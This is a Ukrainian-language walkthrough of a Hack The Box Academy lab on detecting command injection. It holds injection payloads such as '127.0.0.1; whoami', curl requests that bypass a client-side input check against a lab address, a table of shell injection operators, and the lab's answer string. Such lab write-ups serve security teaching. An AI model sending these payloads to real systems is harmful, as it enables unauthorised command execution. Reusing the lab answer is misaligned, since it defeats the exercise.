## Command Injections — Detection: Injection Operators

**Модуль:** [Command Injections](https://academy.hackthebox.com/app/module/109)
**Секція:** [Detection](https://academy.hackthebox.com/app/module/109/section/1032)
**Відповідь:** `Please match the requested format`

***

## Концепція

**Command Injection** — атака при якій зловмисник додає системні команди до вхідних даних, що передаються напряму в shell на сервері. Наприклад, форма "ping IP" виконує `ping 127.0.0.1` — якщо ми введемо `127.0.0.1; whoami`, сервер виконає `ping 127.0.0.1` **і** `whoami`.

Перший крок — **Detection**: перевіряємо чи сервер взагалі вразливий, підставляючи injection operators.

***

## Як отримати відповідь

### Метод A — Браузер (найпростіший)

1. Відкриваємо `http://154.57.164.67:32497`
2. У поле IP вводимо будь-який injection operator після IP:

```
127.0.0.1;
127.0.0.1&&
127.0.0.1|
127.0.0.1%0a
```

3. Натискаємо **Check** → браузер показує HTML5 validation error:

```
Please match the requested format.
```

> **Що це означає:** Форма має HTML5 `pattern` атрибут що обмежує введення лише цифрами та крапками. Браузер блокує input **на рівні клієнта** — це **client-side** захист, який легко обійти через curl або Burp Suite.

### Метод B — curl (обходить client-side перевірку)

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://154.57.164.67:32497"

# Тестуємо різні injection operators
curl -s -X POST "$TARGET/index.php" \
  --data-urlencode "ip=127.0.0.1;" | grep -i "error\|invalid\|format\|uid\|root"

curl -s -X POST "$TARGET/index.php" \
  --data-urlencode "ip=127.0.0.1%0a" | grep -i "uid\|www-data"
```

***

## Таблиця Injection Operators

| Оператор | Символ | URL-encoded | Що виконує |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Обидві команди |
| New Line | `\n` | `%0a` | Обидві команди |
| Background | `&` | `%26` | Обидві (2-га перша) |
| Pipe | `\|` | `%7c` | Лише 2-га |
| AND | `&&` | `%26%26` | Обидві (якщо 1-а успішна) |
| OR | `\|\|` | `%7c%7c` | 2-га (якщо 1-а провалилась) |

***

## Відповідь

```
Please match the requested format.
```
